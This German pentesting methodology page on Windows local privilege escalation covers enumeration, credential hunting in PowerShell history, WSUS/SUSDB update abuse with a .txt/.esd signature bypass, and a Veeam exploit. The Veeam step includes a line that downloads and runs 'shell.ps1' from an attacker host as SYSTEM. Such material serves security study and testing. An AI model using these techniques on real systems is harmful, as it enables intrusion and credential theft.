# Lokale Windows-Privilegieneskalation

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool zum Finden von Vektoren für die lokale Windows-Privilegieneskalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Diese Seite fasst die allgemeine Methodik zur Windows-Privilegieneskalation aus mehreren grundlegenden Anleitungen zusammen.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Der praktische Ablauf der Enumeration basiert außerdem auf Community-Workshops und Checklisten.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Das historische Angriffsmaterial umfasst die DerbyCon-Präsentation zur Windows-Privilegieneskalation.<sup>[[5]](#references)</sup>

## Erste Windows-Grundlagen

### Access Tokens

**Wenn du nicht weißt, was Windows Access Tokens sind, lies vor dem Fortfahren die folgende Seite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Weitere Informationen zu ACLs - DACLs/SACLs/ACEs findest du auf der folgenden Seite:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Wenn du nicht weißt, was Integrity Levels in Windows sind, lies vor dem Fortfahren die folgende Seite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-Sicherheitskontrollen

Es gibt verschiedene Dinge in Windows, die **dich daran hindern können, das System zu enumerieren**, ausführbare Dateien auszuführen oder sogar **deine Aktivitäten zu erkennen**. Du solltest die folgende **Seite lesen** und all diese **Abwehrmechanismen** **enumerieren**, bevor du mit der Enumeration zur Privilegieneskalation beginnst:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Physischer Zugriff kann eine Offline-Bearbeitung des UEFI-NVRAM außerdem in eine Pre-Boot-DMA- und Windows-`SYSTEM`-Memory-Patching-Kette verwandeln:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / stille UIAccess-Erhöhung

UIAccess-Prozesse, die über `RAiLaunchAdminProcess` gestartet werden, können missbraucht werden, um ohne Abfragen High IL zu erreichen, wenn die Secure-Path-Prüfungen von AppInfo umgangen werden. Den speziellen Ablauf zur Umgehung von UIAccess/Admin Protection findest du hier:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Die Weitergabe von Secure-Desktop-Barrierefreiheits-Registrierungsschlüsseln kann für einen beliebigen SYSTEM-Registrierungsschreibzugriff (RegPwn) missbraucht werden:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Neuere Windows-Builds bieten außerdem einen **SMB-LPE-Pfad über beliebige Ports**, bei dem eine privilegierte lokale NTLM-Authentifizierung über eine wiederverwendete SMB-TCP-Verbindung reflektiert wird:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Systeminformationen

Für die lokale Bestandsaufnahme über eine bestehende PowerShell-Sitzung siehe [Windows-Enumeration mit .NET](../basic-powershell-for-pentesters/dotnet-enumeration.md). Diese Beispiele ergänzen die folgenden Prüfungen, ohne separate Enumeration-Programme zu starten.

### Enumeration von Versionsinformationen

Prüfe, ob die Windows-Version bekannte Schwachstellen aufweist (prüfe auch die installierten Patches).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Version Exploits

Diese [Website](https://msrc.microsoft.com/update-guide/vulnerability) ist hilfreich, um detaillierte Informationen zu Microsoft-Sicherheitslücken zu finden. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt die **massive Angriffsfläche**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas enthält watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — erfasst den OS-Build, installierte Updates und ausgewählte potenziell relevante Advisories; überprüfe das genaue Produkt und ersetzende Updates, bevor du ein Ergebnis als zutreffend einstufst.

Bei einem versionsspezifischen lokalen exploit solltest du sowohl die **Architektur des laufenden Prozesses** als auch die OS-Architektur prüfen. Unter 64-Bit-Windows unterliegt ein 32-Bit-Prozess der [WOW64-Dateisystemumleitung](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` verweist üblicherweise auf das 32-Bit-Systemverzeichnis, während `%windir%\Sysnative` dem Prozess Zugriff auf das native Systemverzeichnis ermöglicht. Für einen 64-Bit-Prozess ist dieser Alias nicht verfügbar. Ein OS-Build oder ein Kandidat für ein fehlendes KB beweist nicht, dass ein exploit möglich ist. Vergleiche den laufenden Build, das installierte oder ersetzende Update, die Prozessarchitektur und die Voraussetzungen des exploits mit dem [Microsoft-Sicherheitsbulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) zur konkreten Sicherheitslücke.

Ein Beispiel für eine Speicherbeschädigung in einem Dienst findest du unter [Client-kontrollierte Offsets im MIDI-Ringpuffer für Shared Memory](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Die veröffentlichten Stack-Offsets gelten nur für den getesteten Build. Das Erreichen von `LOCAL SERVICE` ist ein separater Schritt vom späteren [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md)-Schritt zu `SYSTEM`.<sup>[[44]](#references)</sup>

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-Repos mit exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Sind Anmeldedaten oder andere nützliche Informationen in den Umgebungsvariablen gespeichert?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell-Verlauf

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

Eine beschreibbare [PowerShell profile](../basic-powershell-for-pentesters/#powershell-profile-startup-injection) ist ein separater Ansatzpunkt für die Ausführung beim Start. Prüfe, ob ein Benutzer mit höheren Berechtigungen dieses Profil tatsächlich lädt, bevor du es als Privilegieneskalation einstufst.

### PowerShell-Transkriptdateien

Wie du diese Funktion aktivierst, erfährst du hier: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ist nur ein Beispiel. Die [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) schreibt normalerweise in den Documents-Ordner des jeweiligen Benutzers. Eine `OutputDirectory`-Einstellung oder `Start-Transcript -OutputDirectory` kann Dateien jedoch in einen gemeinsamen oder versteckten Ordner umleiten. Prüfe den effektiven Ausgabepfad und die Datei-ACL, bevor du ein Transkript überprüfst: Es kann Befehlsargumente und Ausgaben enthalten, darunter Zugangsdaten. Ein lesbares Transkript ist nur dann ein Hinweis, wenn sein Inhalt eine verwendbare Identität mit höheren Berechtigungen offenlegt und diese Identität sich im relevanten Kontext anmelden kann.

### PowerShell Module Logging

Details zu PowerShell-Pipelineausführungen werden aufgezeichnet, darunter ausgeführte Befehle, Befehlsaufrufe und Teile von Skripten. Allerdings werden möglicherweise nicht alle Ausführungsdetails und Ausgaben erfasst.

Um dies zu aktivieren, befolge die Anweisungen im Abschnitt „Transkriptdateien“ der Dokumentation und wähle **„Module Logging“** statt **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Um die letzten 15 Ereignisse aus PowersShell-Protokollen anzuzeigen, können Sie Folgendes ausführen:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Ein vollständiger Aktivitäts- und Inhaltsnachweis der Skriptausführung wird erfasst, sodass jeder Codeblock während seiner Ausführung dokumentiert wird. Dieser Prozess bewahrt einen umfassenden Prüfpfad aller Aktivitäten, der für die Forensik und die Analyse bösartigen Verhaltens wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt ihrer Ausführung werden detaillierte Einblicke in den Prozess ermöglicht.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Logging-Ereignisse für den Script Block findest du in der Windows-Ereignisanzeige unter folgendem Pfad: **Anwendungs- und Dienstprotokolle > Microsoft > Windows > PowerShell > Operational**.\
Um die letzten 20 Ereignisse anzuzeigen, kannst du Folgendes verwenden:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Interneteinstellungen

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Laufwerke

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Die frühere Anleitung fasste das Risiko wie folgt zusammen:

Sie können das System kompromittieren, wenn Updates nicht über http**S**, sondern über http angefordert werden.

Ein HTTP-WSUS-Endpunkt ist ein Anlass, das Abfangen von Update-Metadaten zu prüfen. Die Ausnutzung hängt außerdem davon ab, ob der Client diesen WSUS-Server verwendet, ob ein Angreifer dessen Datenverkehr abfangen oder kontrollieren kann und welche Vertrauens- und Installationsrichtlinien für Updates auf dem Client gelten. Die URL allein belegt keine Codeausführung. [Microsoft empfiehlt TLS für WSUS-Metadaten](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Prüfen Sie zunächst, ob das Netzwerk WSUS-Updates ohne SSL bezieht, indem Sie Folgendes in cmd ausführen:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Oder Folgendes in PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Wenn du eine Antwort wie eine der folgenden erhältst:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Die ursprüngliche Aussage zur Anwendbarkeit lautete:

Dann **ist es ausnutzbar.** Wenn der letzte Registrierungseintrag gleich `0` ist, wird der WSUS-Eintrag ignoriert.

Wenn `UseWUServer` auf `1` gesetzt ist, verwendet Windows Update den konfigurierten Intranetdienst. Damit ist eine Voraussetzung für den HTTP-Abfangpfad bestätigt, aber nicht, dass ein Abfangen, die Annahme eines bösartigen Updates oder eine Installation mit erhöhten Rechten möglich ist. Wenn der Wert `0` ist, wird dieser konfigurierte WSUS-Endpunkt von dieser Richtlinie nicht ausgewählt.

Um diese Schwachstellen auszunutzen, können Sie Tools wie [Wsuxploit](https://github.com/pimps/wsuxploit) und [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden – das sind für MiTM präparierte Exploit-Skripte, mit denen sich „gefälschte“ Updates in nicht per SSL geschützten WSUS-Datenverkehr einschleusen lassen.

Lesen Sie die Forschung hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Den vollständigen Bericht hier lesen**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Im Wesentlichen wird bei diesem Bug folgende Schwachstelle ausgenutzt:

> Wenn wir die Berechtigung haben, den Proxy unseres lokalen Benutzers zu ändern, und Windows Updates den in den Einstellungen von Internet Explorer konfigurierten Proxy verwendet, können wir [PyWSUS](https://github.com/GoSecure/pywsus) lokal ausführen, um unseren eigenen Datenverkehr abzufangen und Code mit erhöhten Rechten auf unserem System auszuführen.
>
> Da der WSUS-Dienst außerdem die Einstellungen des aktuellen Benutzers verwendet, nutzt er auch dessen Zertifikatspeicher. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostnamen erstellen und dieses Zertifikat zum Zertifikatspeicher des aktuellen Benutzers hinzufügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Datenverkehr abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Validierung nach dem Prinzip „Trust on first use“ für das Zertifikat durchzuführen. Wenn das präsentierte Zertifikat vom Benutzer als vertrauenswürdig eingestuft wird und den korrekten Hostnamen hat, wird es vom Dienst akzeptiert.

Sie können diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es veröffentlicht wurde).

### Vom WSUS-Administrator kontrollierte Updates

Ein separater Angriffsweg besteht, wenn die aktuelle Identität Updates auf einem WSUS-Server **veröffentlichen und genehmigen** kann. Prüfen Sie die effektive Mitgliedschaft in der Gruppe `WSUS Administrators` des Servers sowie alle delegierten WSUS-Berechtigungen und ermitteln Sie anschließend die Clientcomputergruppe, die ein genehmigtes Update erhalten würde. [Microsoft verlangt WSUS-Administratorrechte zum Genehmigen von Updates](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) und [dokumentiert die Vertrauensbeziehung beim Veröffentlichen](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): Clients müssen dem Signaturzertifikat vertrauen, das für lokal veröffentlichte Inhalte verwendet wird. Vergewissern Sie sich, dass das betreffende Update signiert und akzeptiert wird, auf das Ziel anwendbar ist und in einem Kontext mit höheren Berechtigungen installiert wird, bevor Sie dies als Privilegieneskalationspfad einstufen. Ein HTTP-`WUServer`-Wert oder ein Gruppenname allein belegt diese Voraussetzungen nicht.

### Missbrauch benutzerdefinierter SUSDB-Updates: nicht signierte Payloads über `.txt`/`.esd`

Dies ist ein anderer Fehler an der Vertrauensgrenze als das Abfangen einer HTTP-WSUS-Verbindung: Voraussetzung ist ausreichender Zugriff auf die **gespeicherten Prozeduren der WSUS-Datenbank (`SUSDB`)**, um ein benutzerdefiniertes Update zu veröffentlichen und zu genehmigen. Ein möglicher Einstiegspunkt ist das Relaying eines Upstream-WSUS-Computerkontos an einen separaten MSSQL-Server, auf dem `SUSDB` gehostet wird. Die genauen Voraussetzungen hängen von der Bereitstellung ab. Ermitteln Sie daher zunächst die `EXECUTE`-Berechtigungen, anstatt SQL-Administratorrechte vorauszusetzen.<sup>[[38]](#references)[[39]](#references)</sup>

Informationen zum separaten Angriffsweg, bei dem die WSUS-Clientauthentifizierung von HTTP/8530 an LDAP, SMB oder AD CS weitergeleitet wird, finden Sie unter [Missbrauch von WSUS HTTP für NTLM-Relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Das Relay zur externen Datenbank und die Prozedurberechtigungen überprüfen

Bei Bereitstellungen, in denen WSUS einen externen SQL Server verwendet, sollten Sie zunächst prüfen, ob sich das WSUS-Serverkonto bei der Datenbank authentifizieren kann und ob ein NTLM-Relay diesen Listener erreicht. Die SQL-Rolle des Servers kann Zugriff auf Update-Veröffentlichungsprozeduren gewähren, selbst wenn direkte Tabellenschreibvorgänge verweigert werden. Ein fehlgeschlagenes `UPDATE` auf `SUSDB` belegt nicht, dass das Veröffentlichen gesperrt ist. Prüfen Sie in einer autorisierten SQL-Sitzung die effektive Identität, die Rollenmitgliedschaft und die Prozedurberechtigungen, bevor Sie versuchen, ein benutzerdefiniertes Update zu veröffentlichen.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Die Live-Prozedurdefinitionen und die installierte `SoftwareDistributionPackage.xsd` sind hilfreich, um gültige Update-Metadaten zu rekonstruieren. Sowohl ein übergeordnetes Bundle als auch ein untergeordnetes Payload benötigen `UpdateIdentity` (Fragmenttyp `1`), `LocalizedProperties` (`4`) und `ExtendedProperties` (`2`). Erfasse die lokale Revisions-ID, die jeder `spImportUpdate`-Aufruf zurückgibt, und halte die Bundle-Beziehung, Digests, Größe, Content-URL und Revision konsistent. Dies ist ein zustandsbehafteter Publishing-Workflow; ein einzelner erfolgreicher Aufruf einer gespeicherten Prozedur ist kein Beweis für eine clientseitige Ausführung.<sup>[[38]](#references)</sup>

#### Update erstellen, Ziel festlegen und genehmigen

Der Workflow für benutzerdefinierte Updates verwendet legitime WSUS-Prozeduren als eingeschränkte Publishing-API. Die wichtigen Zustandsübergänge sind:<sup>[[38]](#references)</sup>

| Phase | Relevante gespeicherte Prozeduren |
| --- | --- |
| Update-Metadaten importieren | `spImportUpdate` |
| Voraussetzungen sowie lokalisierte und erweiterte XML-Fragmente speichern | `spSaveXMLFragment` |
| Den Content-Digest der angreifergesteuerten URL zuordnen | `spSetBatchURL` |
| Eine Computergruppe auflisten/erstellen und den Client hinzufügen | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Die Installation für diese Gruppe genehmigen | `spDeployUpdate` mit `@actionID = 0` und `@isAssigned = 1` |

Dateiname, Digests, Größe und `CommandLineInstallation`-Handler müssen in den importierten Metadaten und Fragmenten übereinstimmen. Nachdem du die Content-URL und die Zielgruppe festgelegt hast, sieht die abschließende Genehmigung etwa wie folgt aus. Verwende neue Update-, Gruppen- und Deployment-IDs, statt Beispiel-GUIDs wiederzuverwenden.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Erweiterungsbasierter Signature-Bypass

WSUS weist normalerweise beliebige unsignierte ausführbare Inhalte zurück. In `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` setzt der .NET-Pfad `VerifyFile` das Flag für die Zertifikatsprüfung jedoch auf „false“, wenn der angegebene Dateiname mit `.txt` oder `.esd` endet. `CheckCertificateSignature` wird dann übersprungen, ohne zuvor nachzuweisen, dass es sich bei den Bytes um Text oder ein legitimes ESD-Image handelt. Daher kann eine unveränderte PE-Datei, die beispielsweise `payload.exe.txt` heißt, die Inhaltsprüfung bestehen und später vom Befehlszeilen-Installationshandler des Updates gestartet werden. Dies ist ein Richtlinien-/Typverwechslungsfehler, keine Signaturfälschung.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-kompatibles Staging und Automatisierung

Ein Aufruf von `spDeployUpdate` veranlasst WSUS, den registrierten Inhalt abzurufen. Der Ursprung muss die HTTP-Anforderungen von BITS erfüllen: Eine erreichbare URL allein reicht nicht aus, da die Übertragung einen anfänglichen `HEAD`-/`GET`-Ablauf und Byte-Range-Anfragen verwendet. Ein Server ohne Range-Unterstützung erzeugt beim WSUS-Synchronisieren `EventId=364` mit dem Hinweis, dass BITS den Range-Protokollheader benötigt.<sup>[[39]](#references)</sup>

Der Forschungs-PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiert das für die Import-/Fragment-/URL-/Gruppen-/Deployment-Kette erforderliche SQL, enthält einen modifizierten MSSQL-Client zu dessen Ausführung und liefert `BitsWebServer.py` für das Staging von Inhalten mit. Ein minimaler Aufruf in einem autorisierten Lab lautet:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Unbeaufsichtigte Ausführung und Persistenz durch Wiederholungsversuche

Die Interaktion auf Clientseite hängt von der Richtlinie ab. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, Option `4 - Auto download and schedule install`, sorgt dafür, dass ein genehmigtes Update heruntergeladen und nach dem konfigurierten Zeitplan installiert wird, ohne dass der Benutzer es manuell auswählen muss. Beim Testen wurde ein Payload, dessen Update fehlgeschlagen/unvollständig blieb, erneut angeboten, sobald der Callback-Prozess beendet war. Dadurch kann das Verhalten bei Wiederholungsversuchen zu einer wiederkehrenden Persistenz durch Ausführung werden. Das ist auffällig, da der Client einen Status für fehlgeschlagene Updates anzeigt.<sup>[[39]](#references)</sup>

#### Erkennung und Härtungsansätze

Nützliche Ansätze auf Server- und Clientseite für diese Angriffskette sind:<sup>[[39]](#references)</sup>

- Die Ausführung von `spCreateTargetGroup`, `spSetBatchURL` und `spDeployUpdate` in `SUSDB` überwachen; neue Zielgruppen, externe Content-Ursprünge, `.txt`/`.esd`-Update-Payloads und von unerwarteten Principals (insbesondere Nicht-Computerkonten) durchgeführte Bereitstellungen untersuchen.
- `C:\Program Files\Update Services\LogFiles` nach `ContentSyncAgent`, `FileVerified`, dem falsch geschriebenen `FileVerficationFailed` und `EventId=364` durchsuchen; Verifizierungen anhand der Payload-Erweiterung und des Content-Magic-Werts abgleichen, anstatt dem Suffix zu vertrauen.
- Nach wiederholt fehlschlagenden oder erneut versuchten Windows-Update-Installationen sowie nach PE-Ausführung oder unerwarteten untergeordneten Prozessen/Netzwerkaktivitäten von Inhalten mit `.txt`- oder `.esd`-Namen suchen.
- Extended Protection for Authentication für den Datenbankdienst verlangen, sofern unterstützt, und den Datenbanknetzwerkzugriff auf den WSUS-Server und autorisierte administrative Systeme beschränken. `EXECUTE`-Berechtigungen für die benutzerdefinierten Update-Prozeduren minimieren und überwachen.

## Auto-Updater von Drittanbietern und Agent-IPC (local privesc)

Viele Enterprise-Agenten stellen eine IPC-Schnittstelle auf localhost und einen privilegierten Update-Kanal bereit. Wenn die Registrierung an einen Angreifer-Server umgeleitet werden kann und der Updater einer gefälschten Root-CA vertraut oder schwache Signaturprüfungen verwendet, kann ein lokaler Benutzer ein bösartiges MSI bereitstellen, das der SYSTEM-Dienst installiert. Eine verallgemeinerte Technik (basierend auf der Netskope-stAgentSvc-Angriffskette – CVE-2025-0309) finden Sie hier:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM über TCP 9401)

Die ursprüngliche versionsspezifische Beschreibung und der Recon-Hinweis lauteten:

Veeam B&R < `11.0.1.1261` stellt einen localhost-Dienst auf **TCP/9401** bereit, der vom Angreifer kontrollierte Nachrichten verarbeitet und dadurch beliebige Befehle als **NT AUTHORITY\SYSTEM** ermöglicht.<sup>[[12]](#references)</sup>

- **Recon**: Listener und Version bestätigen, z. B. mit `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication und Cloud Connect verwenden standardmäßig einen zentralen Backup-Dienst auf **TCP/9401**. [Veeams Hinweis](https://www.veeam.com/kb4424) beschreibt die nicht authentifizierte Offenlegung verschlüsselter Zugangsdaten der Konfigurationsdatenbank innerhalb des Backup-Netzwerkperimeters; ein separates öffentliches PoC demonstriert einen Pfad zur Befehlsausführung als **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Der Dienst bindet möglicherweise nicht nur an localhost. Prüfen Sie daher die tatsächliche Adresse und PID.

- **Recon**: Bestätigen, dass TCP/9401 zu `Veeam.Backup.Service.exe` gehört, und anschließend das installierte Produkt sowie die Patch-Metadaten prüfen. `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` sind Hinweise, aber keine vollständige Patch-Prüfung.
- **Behobene Mindestversionen**: Veeam nennt **11a build 11.0.1.1261 P20230227** und **12 build 12.0.0.1420 P20230223** als erste behobene Releases; frühere Releases sind betroffen. Eine vierteilige Dateiversion allein kann einen ungepatchten Basis-Build nicht von einem späteren Patch mit derselben Build-Nummer unterscheiden. Prüfen Sie die Patch-Kennung anhand der [Build-Historie des Anbieters](https://www.veeam.com/kb2680), bevor Sie einen Grenz-Build als behoben einstufen.
- **Exploit**: Ein PoC wie `VeeamHax.exe` zusammen mit den erforderlichen Veeam-DLLs im selben Verzeichnis ablegen und dann über den lokalen Socket einen SYSTEM-Payload auslösen:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Der Dienst führt den Befehl als SYSTEM aus.

Der zitierte PoC demonstriert die Befehlsausführung als SYSTEM, wenn die zusätzlichen Voraussetzungen erfüllt sind; der Sicherheitshinweis des Herstellers beschreibt das Problem der Offenlegung von Zugangsdaten.

## KrbRelayUp

Die ursprüngliche Beschreibung der Standardumgebung lautete:

In Windows-**Domänen**umgebungen besteht unter bestimmten Bedingungen eine Schwachstelle zur **lokalen Rechteausweitung**. Dazu gehören Umgebungen, in denen **LDAP signing nicht erzwungen wird,** Benutzer über Self-Rights verfügen, mit denen sie **Resource-Based Constrained Delegation (RBCD)** konfigurieren können, und Benutzer Computer in der Domäne erstellen dürfen. Wichtig ist, dass diese **Voraussetzungen** mit **Standardeinstellungen** erfüllt sind.

Ein lokales Kerberos-Relay kann einen Logon mit geringeren Berechtigungen in einen privilegierten Verzeichnisschreibzugriff umwandeln, wenn sich ein geeigneter COM-Server authentifiziert und der weitergeleitete Principal Rechte auf dem Zielobjekt hat. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) sowohl RBCD- als auch `msDS-KeyCredentialLink`-LDAP-Schreibvorgänge (shadow-credential); KrbRelayUp automatisiert einige dieser Pfade. Eine RBCD-Kette setzt passende Delegierungs- und Zielobjektrechte voraus, während eine shadow-credential-Kette Schreibrechte für Schlüsselanmeldedaten und einen KDC erfordert, der den Zertifikatsauthentifizierungspfad unterstützt. Keiner der beiden Pfade ergibt sich allein aus der Domänenmitgliedschaft.

